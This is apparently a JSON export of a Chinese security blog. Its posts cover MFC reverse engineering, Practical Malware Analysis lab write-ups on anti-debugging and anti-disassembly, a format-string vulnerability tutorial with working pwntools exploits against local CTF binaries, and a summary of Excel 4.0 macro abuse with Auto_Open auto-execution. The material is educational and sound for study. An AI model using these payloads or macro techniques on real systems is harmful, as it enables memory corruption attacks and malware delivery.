{"meta":{"title":"b1ackie'blog","subtitle":"","description":"","author":"b1ackie","url":"https://b1ackie.cn","root":"/"},"pages":[{"title":"about","date":"2021-08-09T07:43:02.000Z","updated":"2021-08-09T08:42:32.202Z","comments":false,"path":"about/index.html","permalink":"https://b1ackie.cn/about/index.html","excerpt":"","text":"b1ackie from satter"}],"posts":[{"title":"MFC逆向-查找控件事件","slug":"MFC逆向-查找控件事件","date":"2022-01-21T02:44:53.000Z","updated":"2022-01-21T07:38:09.028Z","comments":true,"path":"2022/01/21/MFC逆向-查找控件事件/","link":"","permalink":"https://b1ackie.cn/2022/01/21/MFC%E9%80%86%E5%90%91-%E6%9F%A5%E6%89%BE%E6%8E%A7%E4%BB%B6%E4%BA%8B%E4%BB%B6/","excerpt":"","text":"前言最近想做一下腾讯的2016游戏安全竞赛的题目，然后第一题的是一个MFC程序，很久没有调试过MFC程序了，然后来记录一下MFC逆向中如何查找到控件事件的方法吧。 以前我遇见MFC的程序，一般都是直接用API下断的方式，比如断在弹窗，获取文本这些地方。这些方法也可以用，只是感觉没有学习到的这个方法方便。这次搜索了一下，学习了一种新的方式。（怎么以前没想着搜索学习一下呢…） 方法原理首先我们要做MFC类的逆向，比如一些CM，都是想知道当点击按钮的时候的事件，从而来逆算法。在MFC中，程序是使用消息机制来实现操作相应的，数据结构如下： 1234567891011121314struct AFX_MSGMAP&#123; const AFX_MSGMAP* (PASCAL* pfnGetBaseMap)(); const AFX_MSGMAP_ENTRY* lpEntries;&#125;;struct AFX_MSGMAP_ENTRY&#123; UINT nMessage; UINT nCode; UINT nID; UINT nLastID; UINT_PTR nSig; AFX_PMSG pfn;&#125;; 其中nid就是控件的id，pfn代表着处理函数，当此控件被调用时，就会调用此函数。 实际寻找这里就直接拿腾讯的2016游戏安全竞赛题目来做示例了。 首先用Resource Hacker打开文件，此工具可以帮助我们找到控件的ID。我们现在想找的是名为注册的按钮，看到此控件的ID为1003 然后使用IDA进行查找 找到rdata的数据，可以看到如下的结构 可以手动修改结构，看到此时已经修改好了结构，其中sub_401E60，就是我们想要找的当按下注册按钮时的事件处理函数。 接下来就可以开始进行分析了。 参考链接https://www.jianshu.com/p/6e75c5d58230 https://www.cnblogs.com/h2zZhou/p/10593168.html https://blog.csdn.net/SilverMagic/article/details/40623299","categories":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"MFC","slug":"MFC","permalink":"https://b1ackie.cn/tags/MFC/"}]},{"title":"恶意代码分析实战-实验16","slug":"恶意代码分析实战-实验16","date":"2022-01-14T05:41:32.000Z","updated":"2022-01-19T08:51:40.313Z","comments":true,"path":"2022/01/14/恶意代码分析实战-实验16/","link":"","permalink":"https://b1ackie.cn/2022/01/14/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C16/","excerpt":"","text":"Lab 16-1分析首先本程序是实验九的程序，流程都是一样的，只是加入了反调试的手段，就不再对程序本身进行分析了，分析在这里恶意代码分析实战-实验9 只分析一下反调试的内容。反调试的手段主要是这三个，PEB中的BeingDebugged标志，PEB中的processHeap中的flags属性和PEB中的NTGlobalFlag标志。 问题1. 这个恶意代码使用了哪些反调试技术？PEB中的BeingDebugged标志，PEB中的processHeap中的flags属性和PEB中的NTGlobalFlag标志。 2. 当每种反调试技术成功执行时，有什么现象？执行sub_401000，里面是执行自删除 3. 如何应对这些反调试技术？可以手动修改跳转或者这些值。 4. 如何在调试过程中手动修改检测的数据结构？在OD中跟随到数据地址之后，可以直接进行修改，如图中，将地址的数值修改为0即可。 5. 哪一种OD插件可以帮你逃避恶意代码的反调试技术？sharpOD Lab 16-2分析当打开程序时，看到存在一个TLS回调函数，这是一个反调试的函数。看到当进程启动时，会查找是否存在OLLYDBG的窗口，当线程启动时，会调用sub_401020。 这是检测当前是否是调试器加载运行的，SetLastError设置一个不存在的错误值，然后调用OutputDebugStringA，如果当前进程没有被调试器附加那么此函数会失败，错误值会被重新设置，而如果是附加状态，则错误值不会改变。如果是调试器附加状态，会给byte_40A968这个地址的数据加上1。而此影响到的是后续的密码计算。 来到主函数，看到会检查参数，如果没有带参数则会提示输入四位字符密码。然后会创建一个新的线程，之后调用strncmp进行比较，看到后面指定位数4，只比较前四位。 新线程是一些字节操作，主要是通过一系列计算得出输入的密码。 在这里注意两个地方，一个是这里，在这里会加上byte_40A968的值 第二个是这里，这里加上了BeingDebugged标志值。 让程序自己解密，看到输出了结果，因为只比较前四位，所以密码是bzqr（BeingDebugged这种OD自动过了，我手动改了一下标志） 正确的密码，其实后面的p@ss可以不要的，因为前面已经分析过了，只需要前四位一致即可。 但是有一个问题，就是本程序只在XP生效，在win7，win10上运行的时候，密码正常会是bzrr，因为跑的时候OutputDebugStringA会成功执行，但是为什么，我不太清楚。 这里可以写这样的代码测试 12OutputDebugStringA(&quot;helloworld\\n&quot;);printf(&quot;%d&quot;, GetLastError()); win7、win10执行都是不出错的。 所以说如果是XP的话要输入的就是byrr win7上则是bzrr，当然根据分析也可以知道，实际上的正确密码就是byrr 问题1. 在命令行中运行Lab16-2.exe时，会发生什么？提示输入密码 2. 当使用猜测的命令参数运行Lab16-2.exe时，会发生什么？提示错误 3. 命令行密码是什么？byrr 4. 使用IDA pro加载Lab16-2.exe，在main函数的何处可以找到strncmp函数？在Sleep函数下面就是。 5. 在默认设置下，将这个恶意代码加载到OD中会发生什么？会直接退出，因为有一个TLS回调函数。 6. Lab16-2.exe中PE结构的独特之处是什么？有一个tls节 7. 回调发生在哪些位置？主要是进程启动和线程启动时 8. 恶意代码使用哪一种反调试技术使它在调试器中立即终止运行？如何避免这种检查？一个是查找窗口，一个是OutputDebugStringA，都可以通过修改跳转条件来避免。 9. 当你禁用反调试技术后，你在调试器中看到的命令行代码是什么？bzqr 9. 当你禁用反调试技术后，你在调试器中看到的命令行密码是什么？byrr 10. 调试器中找到的密码在命令行中运行有效吗？不管用 11. 哪种反调试技术为调试器和命令行设置不同的密码？如何防御它们？OutputDebugStringA和BeingDebugged标志，检测是否在调试中运行。都可以通过手动修改来进行避免。 Lab 16-3分析本程序和Lab 9-2是相似的程序 sub_4011E0函数是第一个反调试的函数，主要是用QueryPerformanceCounter获取一个时间，然后再次获取，比较差值，如果差值较大，就说明现在正在被动态调试。最后对程序名ocl.exe进行一个处理，得到peo.exe，如果被检测到正在调试，则会让V3=2，那么就会得到错误的程序名qgr.exe。 这里还有一个上一节的内容，自己插入SEH链，这里有个问题，如果动态调试了div ecx这一句，就会无限循环401254-401261这之间的语句，我也不知道为什么会这样，暂时不知道原因。 然后会利用GetTickCount来检测时间，判断是否被调试，sub_401000函数是一个计算的函数，没有任何意义，就是为了拖延时间。 sub_401300是用来解密域名的，里面用了rdtsc指令来获取时间，判断是否被调试，同时这个程序中也有和 sub_4011E0一样的一个手工构造的SEH链。如果被调试的话，调用sub_4010E0，里面执行自删除。 解密出来的域名 剩下的流程与Lab 9-2是一致的，就不分析了。 问题1. 当使用静态分析法分析这个二进制文件时，你看到了哪些字符串？ 2. 当运行这个二进制文件时会发生什么？没有任何反应 3. 如何重命名它，才能使这个二进制文件正常运行？将其重命名为peo.exe 4. 这个恶意代码使用了哪些反调试技术？使用了QueryPerformanceCounter、GetTickCount、rdtsc三种方法检测时间，计算差值判断是否正在被调试。 5. 对每一种反调试技术而言，如果恶意代码确定它运行在调试器中，它将做什么？QueryPerformanceCounter会让程序名解密出现错误；GetTickCount直接退出；rdtsc会执行自删除。 6. 为什么反调试技术在这个恶意代码中能够成功？它在其中还用了手动构造SEH链，当你调试的时候，进入的话时间花费会较长，肯定会大于规定好的最大的差值。 7. 恶意代码使用了哪些域名？使用了adg.malwareanalsysisbook.com","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"恶意代码分析实战-实验15","slug":"恶意代码分析实战-实验15","date":"2022-01-11T08:59:49.000Z","updated":"2022-01-13T07:14:33.280Z","comments":true,"path":"2022/01/11/恶意代码分析实战-实验15/","link":"","permalink":"https://b1ackie.cn/2022/01/11/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C15/","excerpt":"","text":"Lab 15-1分析使用IDA打开程序，看到当前的代码，有几个红色的地方，此时已经被混淆过，让IDA的识别出现了问题。 按D将指令转为数据，然后跳过E8按C，重新构造代码，即可看到正确的汇编代码。 重新构造了汇编代码之后，分析一下程序的流程，首先是检查是否携带参数，这里注意下，argc默认是1，携带一个参数就是2，然后这里的ebp+8是argc参数稍微说明一下。 首先main有三个参数，argc，argv，envp，此时形成栈帧，那么当前栈的ebp+4就是返回地址，再下面就是压入栈的参数了，参数从右向左入栈，那么ebp+8就是argc。这里拿OD动调的来看一下，就明白了。 继续分析，如果参数不对的话，就会跳转到0x40105E处，这里是输出错误的情况 然后是参数的比较，看到这里是ebp+c，刚才已经分析过了，这就是main函数的第二个参数argv，再看它赋值给eax之后，又是eax+4，这是argv是个数组，如果带参数的话，那么argv[1]才是参数。 看到这三处都是在比较参数的指定位置是否是指定的字符，也就是pdq，那么想要输出正确的条件，就需要输入参数pdq。 问题1. 这个二进制程序中使用了何种对抗反汇编技术？通过在正确的语句前，加一个机器码0xE8，这是call指令的机器码，它会将后面的代码识别称为要call的地址，依次来欺骗反汇编。 2. 这个二进制程序使用了什么流氓机器码来欺骗反汇编过程？0xE8 3. 这种对抗反汇编技术被使用了多少次？一共使用了5次 4. 什么命令行参数会让程序输出“Good Job”？pdq Lab 15-2分析使用IDA打开程序，看到部分的代码被识别成为了数据，重新识别一下。 发现混淆有E8、E9、EB这三个十六进制值，分别是call指令和jmp指令，分别对应的重新识别即可。 还有这个地方，实际上就是书中说的，一个字节用在了两个汇编指令之中。首先正常执行，会执行mov ax, 5EBh、xor eax, eax、jz short near ptr loc_4012E6+2这三个语句此时注意这个跳转指令是跳到loc_4012E6+2这个地方，这里也就是4012E8，看IDA中并没有这个地址。 实际上这个地址的开始就是EB这个字节的开始，然后后面是05就是一个jmp指令了，第一次EB是作为mov ax, 5EBh，中给ax赋值的值，第二次是作为跳转指令。 重新构造了指令之后，框选所有的代码，按下P即可重新创建函数，再按F5就可以查看伪代码。 看到整体的流程，在初始化网络之后，会获取hostname然后进行处理，主要是如果是字母Z会替换成A，如果是z会替换成a，如果是数字9会替换成0，其他的则会在原来ascii码的基础上加一。这个变化后的值会作为USER-AGENT，打开一个URL。读取网页内容，再其中搜索Bamboo::后的内容。 但是从401216到401300的代码并没有被翻译成伪代码，不知道为什么。这部分的内容尝试打开一个URL。sub_40130F是将exe的名字进行复制。 读取内容，然后创建一个叫Account Summary.xls.exe得文件，再将内容写入。 执行这个文件 问题1. 程序初始化请求的URL是什么？http://www.practicalmalwareanalysis.com/bamboo.html 2. User-Agent域是如何产生的？是通过hostname来通过一些改变来形成的。 3. 初始化请求时，程序在内存页中查找什么？在查找Bamboo:: 4. 程序如何处理它从页中提取的信息？获取之后会再尝试打开一个URL，然后获取网页的信息写入Account Summary.xls.exe文件之中。 Lab 15-3分析使用IDA打开程序进行分析，看到是一个进程遍历的程序，它会遍历所有的进程，同时遍历进程的所有线程和模块。 模块遍历 线程遍历 sub_4013D1是一个出现错误的时候，提示错误的函数，调用GetLastError获取错误号，再打印出来。 函数刚开始就会修改返回地址，这里先将0x400000给eax，然后or eax ，0x148C此时eax等于0x40148C，这就是想要的返回地址，再写入到[ebp+0x4]这个地址之中，这就是原先返回值得地址。 在IDA中查看一下返回地址的函数，存在混淆。看到红色的地方，是jmp指令，那么大概又是通过跳转的混淆。 重新构造指令之后，查看，发现这段代码主要目的是构造一个结构化异常处理，看到框中的代码把自己的处理函数加入了SEH链中。然后通过xor ecx,ecx、div ecx这两条指令来触发异常。 继续查看这个函数，看到一些指令都没有被识别。 重新构造指令。首先会调用两次解密函数sub_401534，解密一些信息。然后下载资源到指定文件。 然后以隐藏方式启动这个文件 加密的信息，前三行是第一个解密函数解密的信息，最后一行是第二个。 解密函数非常简单，就是一个取反的操作。 解密后的URL 但是有一个问题，就是第二部分密文，没办法进行解密，因为解密函数判断要解密的第一个字节是不是0，但是要解密的信息，起始是0x403040，这里是0，所以导致没办法进行解密。 我们自己解密一下，看到是一个exe名称。 问题1. 恶意代码怎样被初始化调用？通过修改主函数的返回地址，在主函数返回的时候，进行调用。 2. 恶意代码都做了什么？解密一个URL，在上面下载资源保存为spoolsrv.exe并且执行 3. 恶意代码使用了什么URL？http://www.practicalmalwareanalysis.com/tt.html 4. 恶意代码使用了什么文件名？spoolsrv.exe","categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ackie.cn/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ackie.cn/tags/Lab/"}]},{"title":"格式化字符串漏洞","slug":"格式化字符串漏洞","date":"2022-01-06T09:35:24.000Z","updated":"2022-01-11T06:45:39.713Z","comments":true,"path":"2022/01/06/格式化字符串漏洞/","link":"","permalink":"https://b1ackie.cn/2022/01/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"格式化字符串原理介绍格式化字符串函数可以接收可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为可读的字符串格式。几乎所有的C/C++程序都会利用格式化字符串函数来输出信息、调试程序、或者处理字符串。一般来说，格式化字符串在利用的时候主要为三个部分： 格式化字符串函数 格式化字符串 后续参数，可选 格式化字符串函数输入scanf 输出 函数 基本介绍 printf 输出到stdout fprintf 输出到指定FILE流 vprintf 根据参数列表格式化输出到stdout vfprintf 根据参数列表格式化输出到指定的FILE流 sprintf 输出到字符串 snprintf 输出指定字节数到字符串 vsprintf 根据参数列表格式化输出到字符串 vsnprintf 根据参数列表格式化输出指定字节到字符串 setproctitle 设置argv syslog 输出日志 漏洞原理首先来看一下关于printf函数，比如说如下语句 1printf(&quot;color %s, number %d, float %4.2f&quot;, &quot;red&quot;, 123456, 3.14); 当执行到printf前的栈情况是这样的，为了看起来更方便，用gdb调试查看。可以看到当前的栈情况，首先是color %s, number %d, float %4.2f，然后是三个参数。 在进入printf之前，函数会首先获取第一个参数，一个一个读取字符会遇到两种情况。 当前字符不是%，直接输出到相应标准输出。 当前字符是%，继续读取下一个字符，会有三种情况。 如果没有字符，报错； 如果下一个字符是%，输出%； 否则根据相应的字符，获取相应的参数，对其进行解析并输出。 假设前面的程序，语句修改成如下 1printf(&quot;color %s, number %d, float %4.2f&quot;); 此时，对于这个函数并没有提供参数，程序就会将栈上的三个变量分别解析为 解析其地址对应的字符串 解析其内容对应的整型值 解析其内容对应的浮点数 后面两个还好一点，但是对于第一个%s来说，如果提供了一个不可以访问的地址，那么程序就会崩溃，这就是格式化字符串漏洞的基本原理。 漏洞的利用对于格式化字符串的漏洞利用主要是两个利用手段 是程序崩溃，因为%s对应的参数地址不合法的概率较大。 查看进程内容，根据%d，%f输出了栈上的内容。 程序崩溃对于程序崩溃来说，一般情况下这是最简单的利用方式，只需要连续输入若干个%s即可。 1%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s 具体的原理，在前面已经介绍过了。 泄露内存利用格式化字符串的漏洞，我们可以获取我们想要的输出的内容，一般有如下操作： 泄露栈内存 获取某个变量的值 获取某个变量对应地址的内存 泄露任意地址内存 利用GOT表得到libc函数地址，进而获取libc，也可以获取其他libc函数地址 盲打，dump整个程序，获取有用信息 泄露栈内存如下的程序 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(&quot;%s&quot;, s); printf(&quot;%08x.%08x.%08x.%s\\n&quot;, a, b, c, s); printf(s); return 0;&#125; 获取栈变量数值首先是可以利用格式化字符串来获取栈上的变量的数值。 可以看到打印出来三个十六进制值，可以通过调试进一步查看。 可以看到输入%08x.%08x.%08x，打印出来三个栈上的值 如上的方法，是依次获得栈中的每个参数，也可以通过如下方法，获得指定的参数的值。 1%n$x 比如还是刚才的程序，输入%3$x，查看结果，看到输出了第三个参数的值，也就是栈上的第四个值。 获取栈变量对应字符串还可以获得栈变量对应的字符串，只需要输入%s就可以了。 还是这个程序，输入%s查看结果。 泄露任意地址内存刚才尝试了泄露栈上的连续变量，指定的变量，但还时没有能完全控制我们所要泄露的变量的地址。有时，可能需要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址。 如果我们想要控制格式化字符串，我们就要知道该格式化字符串在输出函数调用的时候，用的是第几个参数，假设此时对应的是第n个参数，那么就可以通过如下方式获得某个指定地址addr的内容 addr%n$s 如何确定是第几个参数，就可以通过输入一长列%p来确定[tag]%p%p%p%p%p%p...。 还是拿之前的程序来做例子，输入aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 从图中可以看出，第四个位置是61616161，也就是我们输入的aaaa的ASCII码，那么现在可以确定是第四个参数。 现在尝试获取以下scanf函数的地址，使用pwntools来构造payload。 123456789101112131415from pwn import *sh = process(&quot;./2&quot;)elf = ELF(&quot;./2&quot;)scanf = elf.got[&quot;__isoc99_scanf&quot;]print hex(scanf)payload = p32(scanf) + &quot;%4$s&quot;print payloadgdb.attach(sh)sh.sendline(payload)sh.recvuntil(&quot;%4$s\\n&quot;)print hex(u32(sh.recv()[4:8]))sh.interactive() 看到已经成功打印出了scanf函数的地址 覆盖内存刚才是通过格式化字符串来泄露栈内存以及任意地址的内存，现在来尝试修改任意地址变量的内存，只要变量对应的地址可写，就可以利用格式化字符串来修改其对应的数值。 %n是不输出字符，但是会把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 示例程序 1234567891011121314151617#include &lt;stdio.h&gt;int a = 123, b = 456;int main() &#123; int c = 789; char s[100]; printf(&quot;%p\\n&quot;, &amp;c); scanf(&quot;%s&quot;, s); printf(s); if (c == 16) &#123; puts(&quot;modified c.&quot;); &#125; else if (a == 2) &#123; puts(&quot;modified a for a small number.&quot;); &#125; else if (b == 0x12345678) &#123; puts(&quot;modified b for a big number!&quot;); &#125; return 0;&#125; 一般需要构造的payload如下 1...[overwrite addr]....%[overwrite offset]$n 在这其中，...表示需要填充的内容，overwrite addr 是需要覆盖的地址，overwrite offset表示需要覆盖的地址存储位置是输出函数格式化字符串的第几个参数。由此确定几个步骤： 确定覆盖地址 确定相对偏移 进行覆盖 覆盖栈内存确定覆盖地址首先是要确定覆盖的地址，在这个程序中，就是需要知道变量C的地址，这个示例作为学习，就在代码中直接输出了变量C的地址，比较简单。 确定相对偏移通过调试确定输入的格式化字符串是第几个参数。 调试之后，可以看到，格式化字符串是第六个参数。 进行覆盖现在已经知道了要覆盖的地址，还有覆盖的是第几个参数，现在就可以来尝试进行覆盖了。构造的payload如下，首先是变量C的存储地址，程序会打印，只需要接收即可，然后是%012d，刚才知道%n会把成功输出的字符个数写入，所以地址是四个字节，现在还需要十二个，就是十六。然后是%6$n，刚才分析过，是第六个参数。 1[addr of c]%012d%6$n 完整exp如下： 12345678910from pwn import * sh = process(&#x27;./3&#x27;)c_addr = int(sh.recvuntil(&#x27;\\n&#x27;, drop=True), 16)print hex(c_addr)payload = p32(c_addr) + &#x27;%012d&#x27; + &#x27;%6$n&#x27;print payloadgdb.attach(sh)sh.sendline(payload)print sh.recv()sh.interactive() 看到结果已经成功输出了当C=16时的字符串。 覆盖任意地址内存覆盖小数字现在来考虑一下如何修改data段的变量，将其修改为一个较小的数字，比如说小于机器字长的数字，比如说2。根据前面的例子，我们知道，前面是地址，而这个地址最少都是四字节（32位），所以无论如何都不会小于四字节。 现在就需要重新构建一下payload，可以把地址放在中间，而不需要将其放在最前面，只要能够找到对应的偏移量，也是可以得到对应的数值。刚才那个程序，我们已经分析过格式化字符串是第六个参数，要将2写到指定位置的话，那么地址不能放在前面，前面可以放两个字节任意字符，XX%n，此时这已经是第六个参数，然后是$xXX，这就是第七个参数，最后就是地址，也就是第八个参数，那么此时的payload就可以是以下的形式 1XX%8$nXX[addr] 现在尝试覆盖a的地址，因为a是一个已经初始过得全局变量，在IDA中可以直接看到地址。 完整exp如下： 1234567from pwn import *p = process(&quot;./overwrite&quot;)a_addr = 0x804a024payload = &quot;aa%8$naa&quot; + p32(a_addr)p.sendline(payload)print p.recv()p.interactive() 看到成功输出了a=2的信息。 覆盖大数字刚才是覆盖小数字，现在来尝试覆盖大数字。首先来了解一下变量在内存中的存储格式。所有的变量在内存中都是以字节进行存储的，然后都是以小端序进行存储的。再来回忆一下格式化字符串里面的标志，发现有这样两个标志： hh对于整数类型，printf期待一个从char提升的int尺寸的整型参数。 h对于整数类型，printf期待一个从short提升的int尺寸的整型参数。 确定一下写入的地址，可以直接在IDA中看到，变量b的地址是0x804A028，此时想要的覆盖效果如下： 12340x0804A028-&gt;0x780x0804A029-&gt;0x560x0804A02a-&gt;0x340x0804A02b-&gt;0x12 直接利用wiki中的模板进行计算 12345678910111213141516171819202122232425def fmt(prev, word, index): if prev &lt; word: result = word - prev fmtstr = &quot;%&quot; + str(result) + &quot;c&quot; elif prev == word: result = 0 else: result = 256 + word - prev fmtstr = &quot;%&quot; + str(result) + &quot;c&quot; fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot; return fmtstrdef fmt_str(offset, size, addr, target): payload = &quot;&quot; for i in range(4): if size == 4: payload += p32(addr + i) else: payload += p64(addr + i) prev = len(payload) for i in range(4): payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i) prev = (target &gt;&gt; i * 8) &amp; 0xff return payload 完整的EXP如下 1234567def forb(): sh = process(&#x27;./overwrite&#x27;) payload = fmt_str(6, 4, 0x0804A028, 0x12345678) print payload sh.sendline(payload) print sh.recv() sh.interactive() 成功输出对应信息 了解到在pwntools中还有工具fmtstr_payload，可以直接拿来进行计算。 123456from pwn import *p = process(&quot;./overwrite&quot;)payload = fmtstr_payload(6,&#123;0x804A028:0x12345678&#125;)print payloadp.sendline(payload)p.interactive() 其中第一个参数为偏移，第二个表示写入的数据，数据地址，以及要写入的信息。 例题64位程序格式化字符串漏洞原理对于64位的程序与32位的偏移计算是类似的，只不过64位函数的前6个参数是存储在相应的寄存器中的。而对于漏洞，程序依旧会按照格式化字符串相应格式对其进行解析。 例子例题pwn200 GoodLuck 查看一下保护机制 分析程序，看到漏洞点 使用gdb调试程序，断在printf之前，看到此时的找情况，我们想要的flag在第四个位置，然后这是一个64位的程序，对应的前六个参数都会存在寄存器之中，加上这个偏移量就是10，然后还有一个格式化字符串，作为它的参数，偏移量就是9。所以输入%9$s即可。 完整exp： 1234from pwn import *sh=process(&#x27;./goodluck&#x27;)sh.sendline(&#x27;%9$s&#x27;)print sh.recv() 参考主要都是参考了CTF-WIKI中的内容，一些文字性的内容，也没有修改，都是直接写了wiki中的内容，感觉自己总结能力也比较差，很多东西写的没人家好，还有一些例子我并没有做，主要目前还不是很懂一些知识点，先挖个坑吧，等以后慢慢再回过头来学习。 https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/","categories":[{"name":"PWN","slug":"PWN","permalink":"https://b1ackie.cn/categories/PWN/"}],"tags":[{"name":"格式化字符串","slug":"格式化字符串","permalink":"https://b1ackie.cn/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"Macro 4.0总结","slug":"Macro 4.0总结","date":"2021-12-13T06:24:23.000Z","updated":"2022-01-04T05:39:40.345Z","comments":true,"path":"2021/12/13/Macro 4.0总结/","link":"","permalink":"https://b1ackie.cn/2021/12/13/Macro%204.0%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言上周碰到了一个Excel 宏4.0的xlsb样本，也算是分析的第一个宏病毒，起初对于宏的提取完全没有用，用了很长时间才成功提取并且看到宏代码，所以来稍微的总结一下关于宏4.0的东西。 宏4.0最早在1992年在Excel 4.0版本中引入，是Visual Basic for Applications (VBA) 的前身，和现在的VBA宏不一样，宏4.0可以直接写在表格里。而现在这种老技术又重新流行了起来，主要是这种宏比VBA宏有更好的免杀性。它不依赖于错误，也不是漏洞利用，只是滥用合法的excel功能。一些样本受密码保护，代码混淆，工作表隐藏，以及一些检测机制，使得对于它的分析难度会提高。还有将其保存为xlsb文件，而不是xlsm文件时，一些检测的手段会直接失效，现在来尝试总结分析一下Excel 4.0的手段。 宏4.0 利用现在来演示一下如何利用宏4.0 宏的利用在某个工作表上右键，选择插入 在弹框中选择MS Excel4.0 在新创建的工作表中，在框中输入宏指令，然后右键选择执行。 自动加载方式现在主流的自动加载的方式分别是Auto_Open和Auto_Close Auto_Open会在用户打开文档的时候自动运行 Auto_Close会在用户关闭文档的时候自动运行 上述两种方式自动运行都需要用户允许执行宏代码。 将单元格名称改为Auto_Open，就实现了宏的自动加载。 保存之后，再打开，会看到宏的警告 点击允许，就会弹窗 查看宏代码当我们按下alt+F11查看宏代码的时候，发现这样是不能够查看到宏代码 默认情况下，XLM宏代码存储在xl\\Macrosheets\\下的Sheet1.xml中，解压此xlsm文件，然后打开位于目录中的Sheet1.xml，可以看到刚才写入的宏代码。 但是这种查看方式，只适用于xlsm格式的文件，如果是xlsb的文件，就没办法看了。可以看到里面都是bin文件，查看不了里面的具体内容。 对于xlsm来说，里面的内容都是基于XML的，可以直接打开进行阅读，而xlsb的文件内容则是二进制文件，是没办法直接阅读的。 oletools使用使用工具可以快速的帮助我们进行宏代码的查看 oletools用于帮助分析ole文件，使用它可以帮助我们分析ole文件中是否存在宏代码。 安装好工具后可以开始测试，将刚才的文件保存为test.xlsm来进行测试。 oleid可以查看文件是否存在宏代码，查看test.xlsm文件，看到提示存在XLM Macros 使用olevba可以从MS Office 文档（OLE 和 OpenXML）中提取和分析 VBA 宏源代码，查看test.xlsm，看到成功提取出宏代码 一切保持不变，现在只是将文件保存为xlsb类型的文件，测试看看。 可以看到没有做任何其他的处理，仅仅只是保存为xlsb文件，其中包含的宏 4.0代码就可以没有办法被检测出来。 针对存在宏 4.0的xlsb文件，如何提取其中的宏，我们从一个真实的样本入手 如何提取出来xlsb文件的宏 4.0，我们从一个真实的样本入手。 真实样本分析样本MD5：cf508cefa3b3f03c1d8300f5f57b9af6 样本下载地址 此文件是一个XLSB文件 打开会提示其中还有宏 按下alt+F11看不到任何VBA宏的存在，使用oletools工具同样也无法检测到宏。 看到其存在两个隐藏的工作表 显示隐藏的工作表，看到上面的单元格直接从C到了H，中间被隐藏起来了，另一个工作表也是如此，那么宏代码应该就是在其中了，但是因为工作表被保护起来了，我们没有密码，所以我们无法移动单元格。 现在来尝试获取xlsb中的宏 4.0代码 方法一https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442 按照上述这篇帖子的方法，可以成功绕过密码保护，我们修改单元格长度之后，再修改一下字体颜色（原始字体颜色为白色，隐藏了起来）就可以看到宏代码。 方法二使用工具Cerbero Suite Cerbero Suite 使用此工具，不像刚才那样那么麻烦，可以直接看到工作表中的宏代码 方法三使用XLMMacroDeobfuscator XLMMacroDeobfuscator 这个工具可以非常快速查看宏代码，使用也非常简单，它会自动帮助我们分析其中的宏，并且可以去混淆 1xlmdeobfuscator -f [指定要检测的文件] 由上图可以清晰的看到其中存在的去混淆后的宏代码 看到它主要是下载了6个文件存在指定的位置，并且调用regsvr32来启动下载的文件。 对于下载的文件，只分析出了一小部分的行为，很多关键的地方都没有看懂，所以暂时不放出来，等以后分析明白再放出来。 参考链接https://www.yuque.com/p1ut0/qtmgyx/rqank4 https://zvelo.com/excel-4-0-macros-another-old-school-attack-method/ https://madlabs.dsu.edu/madrid/blog/2021/05/17/analyzing-document-with-malicious-excel-4-0-macros/ https://malware.news/t/xlsb-analyzing-a-microsoft-excel-binary-spreadsheet/46442","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"宏病毒","slug":"宏病毒","permalink":"https://b1ackie.cn/tags/%E5%AE%8F%E7%97%85%E6%AF%92/"},{"name":"Macro 